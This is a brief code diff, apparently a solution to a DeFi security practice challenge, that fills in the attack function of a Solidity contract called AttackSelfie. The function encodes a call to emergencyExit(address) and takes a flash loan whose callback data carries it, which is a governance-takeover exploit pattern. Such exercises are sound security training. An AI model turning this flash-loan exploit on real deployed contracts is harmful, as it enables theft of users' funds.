@@ -48,6 +48,12 @@ contract AttackSelfie is IERC3156FlashBorrower {
     }
 
     function attack() public {
-        
+
+        bytes memory data = abi.encodeWithSignature(
+            "emergencyExit(address)",
+            player
+        );
+
+        pool.flashLoan(this, address(token), amount, data);
     }
 }
